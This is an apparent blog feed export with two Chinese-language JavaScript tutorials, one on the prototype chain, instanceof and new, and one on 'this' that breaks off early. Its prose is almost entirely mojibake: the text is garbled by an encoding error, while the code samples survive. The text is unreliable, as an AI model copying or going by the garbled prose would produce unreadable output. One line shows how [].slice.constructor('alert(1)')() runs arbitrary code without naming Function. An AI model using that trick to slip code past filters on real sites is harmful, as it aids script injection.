æœ€å¾Œå¹«å¤§å®¶ç¸½çµä¸€ä¸‹ï¼Œä¸Šé¢é€™ä¸€æ®µå…¶å¯¦ä¸»è¦æ˜¯å¹«å¤§å®¶è¤‡ç¿’ä¸€ä¸‹ JavaScript çš„ä¸€äº›åŸºç¤ã€‚
ä½ æœ‰ä¸€å€‹å«åšPersonçš„å‡½æ•¸ï¼Œå°±å¯ä»¥æŠŠPersonç•¶ä½œ constructorï¼Œåˆ©ç”¨var obj = new Person()ä¾† new å‡ºä¸€å€‹Personçš„ instanceï¼Œä¸¦ä¸”å¯ä»¥åœ¨Person.prototypeä¸Šé¢åŠ ä¸Šä½ æƒ³è®“æ‰€æœ‰ instance å…±äº«çš„å±¬æ€§æˆ–æ˜¯æ–¹æ³•ã€‚
æ¢ç©¶åŸç†ä¸çŸ¥é“ä½ æœƒä¸æœƒå¥½å¥‡ä¸€ä»¶äº‹ï¼Œä»¥ä¸Šé¢var nick = new Person(&#39;nick&#39;, 18);çš„ä¾‹å­ä¾†èªªï¼Œç•¶æˆ‘åœ¨å‘¼å«nick.log()çš„æ™‚å€™ï¼ŒJavaScript æ˜¯æ€éº¼æ‰¾åˆ°é€™å€‹ function çš„ï¼Ÿ
å› ç‚º nick é€™å€‹ instance æœ¬èº«ä¸¦æ²’æœ‰ log é€™å€‹ functionã€‚ä½†æ ¹æ“š JavaScript çš„æ©Ÿåˆ¶ï¼Œnick æ˜¯ Person çš„ instanceï¼Œæ‰€ä»¥å¦‚æœåœ¨ nick æœ¬èº«æ‰¾ä¸åˆ°ï¼Œå®ƒæœƒè©¦è‘—å¾Person.prototypeå»æ‰¾ã€‚
å¯æ˜¯ï¼ŒJavaScript æ€éº¼çŸ¥é“è¦åˆ°é€™é‚Šå»æ‰¾ï¼Ÿæ‰€ä»¥ä¸€å®šæ˜¯ nick è·ŸPerson.prototypeæœƒé€éæŸç¨®æ–¹å¼é€£æ¥èµ·ä¾†ï¼Œæ‰çŸ¥é“èªªè¦å¾€å“ªé‚Šå»æ‰¾ log é€™å€‹ functionã€‚
è€Œé€™å€‹é€£æ¥çš„æ–¹å¼ï¼Œå°±æ˜¯__proto__ã€‚ï¼ˆé™„è¨»ï¼šå…¶å¯¦æ¯”è¼ƒå¥½çš„æ–¹å¼æ˜¯ç”¨Object.getPrototypeOf()ï¼Œä½†é€™é‚Šç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œé‚„æ˜¯ä½¿ç”¨æ¯”è¼ƒå¸¸è¦‹çš„__proto__ï¼Œæ›´è©³ç´°çš„èªªæ˜å¯åƒè€ƒï¼šMDN: Object.prototype.protoï¼‰
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(nick.__proto__ === Person.prototype) // true

nick çš„__proto__æœƒæŒ‡å‘Person.prototypeï¼Œæ‰€ä»¥åœ¨ç™¼ç¾ nick æ²’æœ‰ log é€™å€‹ method çš„æ™‚å€™ï¼ŒJavaScript å°±æœƒè©¦è‘—é€é__proto__æ‰¾åˆ°Person.prototypeï¼Œå»çœ‹Person.prototypeè£¡é¢æœ‰æ²’æœ‰ log é€™å€‹ methodã€‚
é‚£å‡å¦‚Person.prototypeé‚„æ˜¯æ²’æœ‰å‘¢ï¼Ÿé‚£å°±ç¹¼çºŒä¾ç…§é€™å€‹è¦å‰‡ï¼Œå»çœ‹Person.prototype.__proto__è£¡é¢æœ‰æ²’æœ‰ log é€™å€‹ methodï¼Œå°±é€™æ¨£ä¸€ç›´ä¸æ–·æ‰¾ä¸‹å»ã€‚æ‰¾åˆ°æ™‚å€™æ™‚å€™ç‚ºæ­¢ï¼Ÿæ‰¾åˆ°æŸå€‹æ±è¥¿çš„__proto__æ˜¯ null ç‚ºæ­¢ã€‚æ„æ€å°±æ˜¯é€™é‚Šæ˜¯æœ€ä¸Šå±¤äº†ã€‚
è€Œä¸Šé¢é€™ä¸€æ¢é€é__proto__ä¸æ–·ä¸²èµ·ä¾†çš„éŠï¼Œå°±å«åšåŸå‹éŠã€‚é€éé€™ä¸€æ¢åŸå‹éŠï¼Œå°±å¯ä»¥é”æˆé¡ä¼¼ç¹¼æ‰¿çš„åŠŸèƒ½ï¼Œå¯ä»¥å‘¼å«è‡ªå·± parent çš„ methodã€‚
çœ‹ä¸‹é¢é€™æ®µç¨‹å¼ç¢¼ä½ å¤§æ¦‚æœƒæœ‰ä¸€äº›æ„Ÿè¦ºï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  // é€™å€‹å‰›è¬›éäº†ï¼Œnick.__proto__ æœƒæŒ‡å‘ Person.prototypeconsole.log(nick.__proto__ === Person.prototype) // true  // é‚£ Person.prototype.__proto__ æœƒæŒ‡å‘èª°å‘¢ï¼ŸæœƒæŒ‡å‘ Object.prototypeconsole.log(Person.prototype.__proto__ === Object.prototype) // true  // é‚£ Object.prototype.__proto__ åˆæœƒæŒ‡å‘èª°å‘¢ï¼ŸæœƒæŒ‡å‘ nullï¼Œé€™å°±æ˜¯åŸå‹éŠçš„é ‚ç«¯äº†console.log(Object.prototype.__proto__) // null

å¦‚æœæƒ³çŸ¥é“ä¸€å€‹å±¬æ€§æ˜¯å­˜åœ¨ instance èº«ä¸Šï¼Œé‚„æ˜¯å­˜åœ¨æ–¼å®ƒå±¬æ–¼çš„åŸå‹éŠç•¶ä¸­ï¼Œå¯ä»¥ç”¨hasOwnPropertyé€™å€‹æ–¹æ³•ï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);console.log(nick.hasOwnProperty(&#x27;log&#x27;)); // falseconsole.log(nick.__proto__.hasOwnProperty(&#x27;log&#x27;)); // true

æœ‰äº†hasOwnPropertyä¹‹å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥è‡ªå·±ä¾†æ¨¡æ“¬é€™æ®µå¾€ä¸Šæ‰¾çš„éç¨‹ï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  function call(obj, methodName) &#123;  var realMethodOwner = obj;    // ä¸æ–·å¾€ä¸Šæ‰¾ï¼Œç›´åˆ° null æˆ–è€…æ˜¯æ‰¾åˆ°çœŸçš„æ“æœ‰é€™å€‹ method çš„äººç‚ºæ­¢  while(realMethodOwner &amp;&amp; !realMethodOwner.hasOwnProperty(methodName)) &#123;    realMethodOwner = realMethodOwner.__proto__;  &#125;    // æ‰¾ä¸åˆ°å°±ä¸Ÿä¸€å€‹ errorï¼Œå¦å‰‡åŸ·è¡Œé€™å€‹ method  if (!realMethodOwner) &#123;    throw &#x27;method not found.&#x27;;  &#125; else &#123;    realMethodOwner[methodName].apply(obj);  &#125;&#125;  call(nick, &#x27;log&#x27;); // nick, age:18call(nick, &#x27;not_exist&#x27;); // Uncaught method not found.

åšåˆ°é€™é‚Šï¼Œå…¶å¯¦ä½ å·²ç¶“å°åŸå‹éŠæœ‰äº†æ¯”è¼ƒæ·±åˆ»çš„äº†è§£äº†ã€‚
ä¾†è€ƒä½ ä¸€é¡Œï¼ŒPerson.__proto__æœƒæ˜¯ä»€éº¼ï¼Ÿ
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(Person.__proto__ === Function.prototype); // trueconsole.log(Function.prototype.__proto__ === Object.prototype) // trueconsole.log(Object.prototype.__proto__); //null

å› ç‚ºPersonå…¶å¯¦å°±æ˜¯å€‹ Function çš„ instanceï¼Œæ‰€ä»¥Person.__proto__ç•¶ç„¶å°±æ˜¯Function.prototypeå›‰ï¼
instanceofé¡§åæ€ç¾©ï¼ŒA instanceof B å°±æ˜¯æ‹¿ä¾†åˆ¤æ–· A æ˜¯ä¸æ˜¯ B çš„ instanceï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  console.log(nick instanceof Person); // trueconsole.log(nick instanceof Object); // trueconsole.log(nick instanceof Array); // false

å¾ç¯„ä¾‹ä¸­å¯ä»¥çœ‹å‡ºï¼Œåªè¦èƒ½åœ¨ A çš„åŸå‹éŠè£¡é¢æ‰¾åˆ° B çš„ prototypeï¼Œå°±æœƒå›å‚³ trueã€‚çŸ¥é“åŸç†ä¹‹å¾Œï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥ä¾†ç°¡å–®æ¨¡æ“¬ä¸€ä¸‹ instnaceof åœ¨åšçš„äº‹ï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  function instanceOf(A, B) &#123;    // å·²ç¶“æ‰¾å®Œäº†  if (!A) return false;    // æ²’æ‰¾åˆ°çš„è©±ï¼Œç¹¼çºŒå¾€ä¸Šæ‰¾  return A.__proto__ === B.prototype ? true : instanceOf(A.__proto__, B);&#125;  console.log(instanceOf(nick, Person)); // trueconsole.log(instanceOf(nick, Object)); // trueconsole.log(instanceOf(nick, Array)); // false

è€Œ instanceof æœ‰ä¸€å€‹å¾ˆæœ‰è¶£çš„ç¾è±¡ï¼Œé‚£å°±æ˜¯ï¼š
// é€™å…©å€‹äº’ç‚ºå½¼æ­¤çš„ instanceconsole.log(Function instanceof Object); // trueconsole.log(Object instanceof Function); // true  // Function çš„ __proto__ æœƒæŒ‡å‘ Function.prototype// è€Œ Function.prototype çš„ __proto__ æœƒæŒ‡å‘ Object.prototypeconsole.log(Function.__proto__ === Function.prototype); // trueconsole.log(Function.__proto__.__proto__ === Object.prototype); //true  // Object çš„ __proto__ æœƒæŒ‡å‘ Function.prototypeconsole.log(Object.__proto__ === Function.prototype); // true

é€™å€‹æ±è¥¿åˆæœƒæŠŠå•é¡Œæå¾—æ›´è¤‡é›œï¼Œåœ¨é€™é‚Šå°±å…ˆä¸æäº†ã€‚å¦‚æœæƒ³çŸ¥é“çš„è©±ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢é€™å…©ç¯‡æ–‡ç« ï¼š

ä»__proto__å’Œprototypeæ¥æ·±å…¥ç†è§£JSå¯¹è±¡å’ŒåŸå‹é“¾
ç†è§£JavaScriptçš„åŸå‹é“¾å’Œç»§æ‰¿

constructoré †å¸¶ä¸€æï¼Œæ¯ä¸€å€‹ prototype éƒ½æœƒæœ‰ä¸€å€‹å«åšconstructorçš„å±¬æ€§ï¼Œä¾‹å¦‚èªªPerson.prototype.constructorï¼Œè€Œé€™å€‹å±¬æ€§å°±æœƒæŒ‡å‘æ§‹é€ å‡½æ•¸ã€‚Person.prototypeçš„æ§‹é€ å‡½æ•¸æ˜¯ä»€éº¼ï¼Ÿç•¶ç„¶å°±æ˜¯Personå›‰ã€‚
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);  // é€™æ®µæ˜¯è¦è®“å¤§å®¶çŸ¥é“ï¼Œé€™é‚Šå…¶å¯¦æ˜¯å¾€åŸå‹éŠçš„ä¸Šé¢å»æ‰¾console.log(nick.constructor === Person); // trueconsole.log(nick.hasOwnProperty(&#x27;constructor&#x27;)); // false  // Person çš„ constructor å°±æ˜¯ Personconsole.log(Person.prototype.constructor === Person); // trueconsole.log(Person.prototype.hasOwnProperty(&#x27;constructor&#x27;)); // true

æ‰€ä»¥å…¶å¯¦constructorä¹Ÿæ²’ä»€éº¼å¥½è¬›çš„ï¼ŒA.prototype.constructor === Aï¼Œä½ æŠŠ A ç”¨ Function, Person, Object ä¹‹é¡çš„å€¼å¸¶é€²å»éƒ½æˆç«‹ã€‚
æœ‰ä¸€å€‹æ¯”è¼ƒæœ‰è¶£çš„åœ°æ–¹æ˜¯ï¼Œä½ å¯ä»¥é€éé€™æ¨£çš„æ–¹å¼ä¾†åŸ·è¡Œä¸€æ®µç¨‹å¼ç¢¼ï¼š[].slice.constructor(&#39;alert(1)&#39;)()ã€‚åŸç†å…¶å¯¦å°±æ˜¯æŠŠFunction(&#39;alert(1)&#39;)()çš„Functionç”¨[].slice.constructorä¾†å–ä»£æ‰ã€‚
newæœ‰äº†åŸå‹éŠçš„æ¦‚å¿µä¹‹å¾Œï¼Œå°±ä¸é›£ç†è§£newé€™å€‹é—œéµå­—èƒŒå¾Œæœƒåšçš„äº‹æƒ…æ˜¯ä»€éº¼ã€‚
å‡è¨­ç¾åœ¨æœ‰ä¸€è¡Œç¨‹å¼ç¢¼æ˜¯ï¼švar nick = new Person(&#39;nick&#39;);ï¼Œé‚£å®ƒæœ‰ä»¥ä¸‹å¹¾ä»¶äº‹æƒ…è¦åšï¼š

å‰µå‡ºä¸€å€‹æ–°çš„ objectï¼Œæˆ‘å€‘å«å®ƒ O
æŠŠ O çš„ __proto__ æŒ‡å‘ Person çš„ prototypeï¼Œæ‰èƒ½ç¹¼æ‰¿åŸå‹éŠ
æ‹¿ O ç•¶ä½œ contextï¼Œå‘¼å« Person é€™å€‹å»ºæ§‹å‡½å¼
å›å‚³ O

æˆ‘å€‘å¯ä»¥å¯«ä¸€æ®µç¨‹å¼ç¢¼ä¾†æ¨¡æ“¬é€™å€‹æƒ…å½¢ï¼š
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  function newObj(Constructor, arguments) &#123;  var o = new Object();    // è®“ o ç¹¼æ‰¿åŸå‹éŠ  o.__proto__ = Constructor.prototype;    // åŸ·è¡Œå»ºæ§‹å‡½å¼  Constructor.apply(o, arguments);    // å›å‚³å»ºç«‹å¥½çš„ç‰©ä»¶  return o;&#125;  var nick = newObj(Person, [&#x27;nick&#x27;, 18]);nick.log(); // nick, age:18

å»¶ä¼¸é–±è®€ï¼šJS å¯¹è±¡æœºåˆ¶æ·±å‰–â€”â€”new è¿ç®—ç¬¦
ç¸½çµä»Šå¤©ä¸ä½†æ›´ç†è§£äº†åŸå‹éŠåˆ°åº•æ˜¯ä»€éº¼æ±è¥¿ï¼Œä¹Ÿå¯«äº†ä¸€äº›ç°¡å–®çš„å°ç¨‹å¼ä¾†æ¨¡æ“¬ JavaScript åœ¨æŸ¥æ‰¾åŸå‹éŠçš„éç¨‹ã€‚è—‰ç”±è‡ªå·±å¯¦ä½œé€™äº›æ©Ÿåˆ¶ä¹‹å¾Œï¼Œæ‡‰è©²æœƒå°åŸå‹éŠæœ‰æ›´å¤šçš„ä¸€äº›ç†è§£ã€‚
åœ¨ JavaScript é€™å€‹ç¨‹å¼èªè¨€ç•¶ä¸­ï¼Œå°±æ˜¯é€éåŸå‹éŠé€™æ¨£å­çš„æ©Ÿåˆ¶ï¼ŒæŠŠä¸Šä¸‹é—œä¿‚çµ¦ä¸²èµ·ä¾†ï¼Œç•¶ä½ åœ¨ A æ‰¾ä¸åˆ°æŸå€‹æ±è¥¿çš„æ™‚å€™ï¼Œå°±å¯ä»¥åˆ° A çš„ parentï¼ˆä¹Ÿå°±æ˜¯ A.__proto__ï¼‰å»æ‰¾ï¼Œé‚„æ˜¯æ‰¾ä¸åˆ°çš„è©±å°±å†å¾€ä¸Šã€‚è€ŒåŸå‹éŠçš„ç›¡é ­å°±æ˜¯Object.prototypeï¼Œå†å¾€ä¸Šæ‰¾å°±æ˜¯nulläº†ã€‚
åœ¨å¯«é€™ç¯‡æ–‡ç« çš„æ™‚å€™åƒè€ƒäº†è¨±å¤šè³‡æ–™ï¼Œæˆ‘éƒ½é™„åœ¨ä¸‹é¢äº†ã€‚æœ‰äº›æ–‡ç« æœƒé™„ä¸Šç²¾ç¾åœ–ç‰‡ï¼Œä½†æˆ‘è¦ºå¾—å¾åœ–ç‰‡é–‹å§‹åè€Œæœƒæœ‰é»éœ§ç…ç…ï¼Œå› ç‚ºä¸çŸ¥é“å½¼æ­¤ä¹‹é–“çš„é—œè¯æ˜¯æ€éº¼ä¾†çš„ã€‚
å»ºè­°å¤§å®¶çœ‹å®Œé€™ç¯‡ä¹‹å¾Œå¯ä»¥çœ‹ä¸€ä¸‹åº•ä¸‹é‚£äº›åƒè€ƒè³‡æ–™ï¼Œä¹Ÿé †ä¾¿è¤‡ç¿’ä¸€ä¸‹è‡ªå·±çš„è§€å¿µæ˜¯å¦æ­£ç¢ºã€‚
åƒè€ƒè³‡æ–™
JavaScriptæ·±å…¥ä¹‹ä»åŸå‹åˆ°åŸå‹é“¾
JSåŸå‹é“¾å›¾è§£æ•™ç¨‹
ç†è§£JavaScriptçš„åŸå‹é“¾å’Œç»§æ‰¿
ä»__proto__å’Œprototypeæ¥æ·±å…¥ç†è§£JSå¯¹è±¡å’ŒåŸå‹é“¾
Javascript åŸå‹é“¾
å½»åº•ç†è§£JavaScriptåŸå‹

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>prototype</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºè«‡ JavaScript é ­è™Ÿé›£é¡Œ thisï¼šçµ•å°ä¸å®Œæ•´ï¼Œä½†ä¿è­‰å¥½æ‡‚</title>
    <url>/2019/02/23/javascript-this/</url>
    <content><![CDATA[å‰è¨€åœ¨ JavaScript è£¡é¢ï¼Œæœ‰ä¸€å€‹ä»¤æ–°æ‰‹ååˆ†é ­ç—›ï¼Œè€æ‰‹ä¹Ÿä¸ä¸€å®šèƒ½å®Œå…¨ç†è§£çš„ä¸»é¡Œï¼šã€Œthis æ˜¯ä»€éº¼ï¼Ÿã€ã€‚èº«ç‚ºä¸€å€‹ä»¥ JavaScript ç•¶ä½œåƒé£¯å·¥å…·çš„å‰ç«¯å·¥ç¨‹å¸«ï¼Œæˆ‘ä¹Ÿè¢«é€™å€‹å•é¡Œå›°æ“¾äº†è¨±ä¹…ã€‚
æˆ‘åŸæœ¬ä»¥ç‚ºæˆ‘é€™è¼©å­éƒ½ä¸æœƒå¯«æœ‰é—œæ–¼ this çš„æ–‡ç« ã€‚
åŸå› æœ‰å…©å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯è¬›è§£ this çš„æ–‡ç« å·²ç¶“è¶…ç´šç„¡æ•µå¤šäº†ï¼Œè€Œä¸”æ¯ä¸€ç¯‡éƒ½å¯«å¾—å¾ˆä¸éŒ¯ï¼Œä¹‹å‰çœ‹å®Œ Whatâ€™s THIS in JavaScript ? ç³»åˆ—ä¹‹å¾Œè¦ºå¾—è¬›è§£çš„å¾ˆå®Œæ•´ï¼Œè‹¥æ˜¯æ²’æœ‰æŠŠæ¡è‡ªå·±èƒ½å¤ è¬›å¾—æ›´æ¸…æ¥šæˆ–æ˜¯ä»¥ä¸åŒçš„è§’åº¦åˆ‡å…¥ï¼Œä¼¼ä¹å°±æ²’å¿…è¦å†å¯«ä¸€ç¯‡æ–‡ç« ï¼›ç¬¬äºŒå€‹åŸå› æ˜¯è‹¥æ˜¯æƒ³è¦ã€Œå®Œå…¨ã€ææ‡‚ thisï¼Œè¦ä»˜å‡ºçš„æˆæœ¬å¯èƒ½æ¯”ä½ æƒ³åƒä¸­è¦å¤§å¾—å¤šã€‚
é€™è£¡æ‰€èªªçš„ã€Œå®Œå…¨ã€æŒ‡çš„æ˜¯ç„¡è«–åœ¨ä»»ä½•æƒ…æ³ä¸‹ï¼Œä½ éƒ½æœ‰è¾¦æ³•è¬›å‡ºç‚ºä»€éº¼ this çš„å€¼æ˜¯é€™æ¨£ï¼Œç›´æ¥çµ¦å¤§å®¶ä¸€å€‹ç¯„ä¾‹ï¼š
var value = 1;  var foo = &#123;  value: 2,  bar: function () &#123;    return this.value;  &#125;&#125;  //ç¯„ä¾‹1console.log(foo.bar());//ç¯„ä¾‹2console.log((foo.bar)());//ç¯„ä¾‹3console.log((foo.bar = foo.bar)());//ç¯„ä¾‹4console.log((false || foo.bar)());//ç¯„ä¾‹5console.log((foo.bar, foo.bar)());

ä½ èƒ½ç­”çš„å‡ºä¾†å—ï¼Ÿå¦‚æœä¸è¡Œçš„è©±ï¼Œä»£è¡¨ä½ æ²’æœ‰ã€Œå®Œå…¨ã€æ‡‚ thisã€‚è¦å®Œå…¨æ‡‚ this ä¹‹æ‰€ä»¥è¦ä»˜å‡ºçš„æˆæœ¬å¾ˆå¤§ï¼Œå°±æ˜¯å› ç‚ºã€Œå®Œå…¨æ‡‚ thisã€æŒ‡çš„å°±æ˜¯ã€Œç†Ÿè¨˜ ECAMScript è¦ç¯„ã€ã€‚this çš„å€¼æ˜¯ä»€éº¼ä¸æ˜¯æˆ‘å€‘æ†‘ç©ºæƒ³åƒçš„ï¼Œå…¶å¯¦èƒŒå¾Œéƒ½æœ‰å®Œæ•´çš„å®šç¾©ï¼Œè€Œé‚£å€‹å®šç¾©å°±æ˜¯æ‰€è¬‚çš„ ECMAScript è¦ç¯„ï¼Œä½ å¿…é ˆå…ˆææ‡‚é€™å€‹è¦ç¯„ï¼Œæ‰æœ‰å¯èƒ½å®Œå…¨ç†è§£ this åœ¨æ¯å€‹æƒ…æ³ä¸‹æ‰€æŒ‡æ¶‰çš„å°è±¡ã€‚
è‹¥æ˜¯ä½ çœŸçš„å¾ˆæƒ³å®Œå…¨ææ‡‚ï¼Œæ¨è–¦ä½ é€™ä¸€ç¯‡ï¼šJavaScriptæ·±å…¥ä¹‹ä»ECMAScriptè§„èŒƒè§£è¯»thisï¼Œæˆ‘ä¸Šé¢çš„ç¯„ä¾‹å°±æ˜¯å¾é€™ä¸€ç¯‡æ‹¿ä¾†çš„ï¼Œæƒ³çœ‹è§£ç­”ã€æƒ³ç†è§£ç‚ºä»€éº¼çš„è©±å¯ä»¥å»çœ‹é€™ä¸€ç¯‡ã€‚
æ—¢ç„¶æˆ‘å‰é¢æäº†é€™éº¼å¤šè®“æˆ‘ä¸å¯« this çš„ç†ç”±ï¼Œæ€éº¼æœ€å¾Œæˆ‘é‚„æ˜¯è·³ä¸‹ä¾†å¯«äº†ï¼Ÿ
å› ç‚ºï¼Œåœ¨æˆ‘çœ‹äº†é€™éº¼å¤šçš„æ–‡ç« ï¼Œå¸å–äº†ä¸€å¤§å †æ—¥æœˆç²¾è¯ä¸¦ä¸”æ€è€ƒéå¾Œï¼Œç™¼ç¾å¦‚æœæœ‰å€‹ä¸éŒ¯çš„åˆ‡å…¥é»ï¼Œæˆ–è¨±å°±å¯ä»¥è®“ this è®Šå¾—ä¸æ˜¯é€™éº¼é›£æ‡‚ã€‚ä»¥æˆ‘é€™ç¯‡æ•™çš„æ–¹æ³•ï¼Œä¸æœƒè®“ä½ æŠŠ this å®Œå…¨ææ‡‚ï¼Œä¸Šé¢é‚£äº”å€‹ç¯„ä¾‹ä½ å¯èƒ½æœƒç­”éŒ¯ï¼Œä½†åŸºæœ¬çš„é¡Œç›®ä½ ä¾èˆŠå¯ä»¥è§£çš„å‡ºä¾†ã€‚
é€™ä¹Ÿæ˜¯æ¨™é¡Œçš„ç”±ä¾†ï¼šã€Œçµ•å°ä¸å®Œæ•´ï¼Œä½†ä¿è­‰å¥½æ‡‚ã€ï¼Œæ­¤æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›æä¾›ä¸€å€‹ä¸åŒçš„è§’åº¦ä¾†çœ‹ thisï¼Œå¾ç‚ºä»€éº¼æœƒæœ‰ this ä¸‹æ‰‹ï¼Œå†ç”¨ä¸€å¥—è¦å‰‡ä¾†è§£é‡‹ this çš„å€¼ï¼Œè‡³å°‘è®“ä½ ä¸å†å° this æœ‰èª¤è§£ï¼Œä¹ŸæœƒçŸ¥é“ä¸€äº›å¸¸è¦‹çš„æƒ…å¢ƒåº•ä¸‹ this åˆ°åº•æ˜¯ä»€éº¼ã€‚
è¦è«‡ thisï¼Œè¦å¾ç‰©ä»¶å°å‘é–‹å§‹è«‡ï¼ˆè‹¥æ˜¯ä½ å° JavaScript çš„ç‰©ä»¶å°å‘å®Œå…¨æ²’æ¦‚å¿µï¼Œä½ å¯ä»¥å…ˆè£œå®Œç›¸é—œåŸºç¤ï¼Œä¸¦ä¸”çœ‹å®Œé€™ç¯‡ï¼šè©²ä¾†ç†è§£ JavaScript çš„åŸå‹éŠäº†ï¼‰
å¦‚æœä½ æœ‰å¯«éå…¶ä»–ç¨‹å¼èªè¨€ï¼Œä½ å°±çŸ¥é“ this å¾ä¾†éƒ½ä¸æ˜¯ä¸€ä»¶ä»€éº¼å›°é›£çš„äº‹ã€‚å®ƒä»£è¡¨çš„å°±æ˜¯åœ¨ç‰©ä»¶å°å‘è£¡é¢ï¼Œé‚£å€‹ instance æœ¬èº«ã€‚
æˆ‘èˆ‰å€‹ä¾‹å­ï¼š
class Car &#123;  setName(name) &#123;    this.name = name  &#125;    getName() &#123;    return this.name  &#125;&#125;  const myCar = new Car()myCar.setName(&#x27;hello&#x27;)console.log(myCar.getName()) // hello

åœ¨ä¸Šé¢æˆ‘å€‘å®£å‘Šäº†ä¸€å€‹ class Carï¼Œå¯«äº† setName è·Ÿ getName å…©å€‹æ–¹æ³•ï¼Œåœ¨è£¡é¢ç”¨this.nameä¾†å–æ”¾é€™å€‹ instance çš„å±¬æ€§ã€‚
ç‚ºä»€éº¼è¦é€™æ¨£å¯«ï¼Ÿå› ç‚ºé€™æ˜¯å”¯ä¸€çš„æ–¹æ³•ï¼Œä¸ç„¶ä½ è¦æŠŠ name é€™å€‹å±¬æ€§å­˜åœ¨å“ªè£¡ï¼Ÿæ²’æœ‰å…¶ä»–åœ°æ–¹è®“ä½ å­˜äº†ã€‚æ‰€ä»¥ this çš„ä½œç”¨åœ¨é€™è£¡æ˜¯é¡¯è€Œæ˜“è¦‹çš„ï¼Œæ‰€æŒ‡åˆ°çš„å°è±¡å°±æ˜¯é‚£å€‹ instance æœ¬èº«ã€‚
ä»¥ä¸Šé¢çš„ç¯„ä¾‹ä¾†èªªï¼ŒmyCar.setName(&#39;hello&#39;)ï¼Œæ‰€ä»¥ this å°±æœƒæ˜¯myCarã€‚åœ¨ç‰©ä»¶å°å‘çš„ä¸–ç•Œè£¡é¢ï¼Œthis çš„ä½œç”¨å°±æ˜¯é€™éº¼å–®ç´”ã€‚
æˆ–è€…æ›å¥è©±èªªï¼Œæˆ‘èªç‚ºï¼š

ä¸€ä½†è„«é›¢äº†ç‰©ä»¶å°å‘ï¼Œå…¶å¯¦ this å°±æ²’æœ‰ä»€éº¼å¤ªå¤§çš„æ„ç¾©

å‡è¨­ä»Šå¤© this åªèƒ½åœ¨ class è£¡é¢ä½¿ç”¨ï¼Œé‚£æ‡‰è©²å°±ä¸æœƒæœ‰ä»»ä½•å•é¡Œå°å§ï¼Ÿä½ æœ‰çœ‹éå…¶ä»–ç¨‹å¼èªè¨€åƒæ˜¯å¯« Java æˆ–æ˜¯ C++ çš„äººåœ¨æŠ±æ€¨èªª this å¾ˆé›£æ‡‚å—ï¼Ÿæ²’æœ‰ï¼Œå› ç‚º this çš„ä½œç”¨å¾ˆå–®ç´”ã€‚
é‚£å•é¡Œæ˜¯ä»€éº¼ï¼Ÿå•é¡Œå°±æ˜¯åœ¨ JavaScript è£¡é¢ï¼Œä½ åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥å­˜å–åˆ° thisã€‚æ‰€ä»¥åœ¨ JavaScript è£¡çš„ this è·Ÿå…¶ä»–ç¨‹å¼èªè¨€æ…£ç”¨çš„é‚£å€‹ this æœ‰äº†å·®ç•°ï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼ this é›£æ‡‚çš„åŸå› ã€‚
å„˜ç®¡ this çš„å®šç¾©ä¸å¤ªä¸€æ¨£ï¼Œä½†æˆ‘èªç‚ºæœ¬è³ªä¸Šé‚„æ˜¯å¾ˆé¡ä¼¼çš„ã€‚è¦ç†è§£ this çš„ç¬¬ä¸€æ­¥å°±æ˜¯å‘Šè¨´è‡ªå·±ï¼šã€Œä¸€ä½†è„«é›¢äº†ç‰©ä»¶ï¼Œå°±ä¸å¤ªéœ€è¦é—œæ³¨ this çš„å€¼ï¼Œå› ç‚ºæ²’ä»€éº¼æ„ç¾©ã€
æ²’ä»€éº¼å¤ªå¤§æ„ç¾©çš„ thisfunction hello()&#123;  console.log(this)&#125;  hello()

this çš„å€¼æœƒæ˜¯ä»€éº¼ï¼Ÿ
å»¶çºŒæˆ‘å€‘å‰é¢æ‰€è¬›çš„ï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹æˆ‘æœƒè·Ÿä½ èªª this æ²’æœ‰ä»»ä½•æ„ç¾©ï¼Œè€Œä¸”ä½ åƒè¬ä¸è¦æƒ³æˆ this æœƒæŒ‡åˆ°helloé€™å€‹ functionï¼Œæ²’æœ‰é€™ç¨®äº‹ã€‚
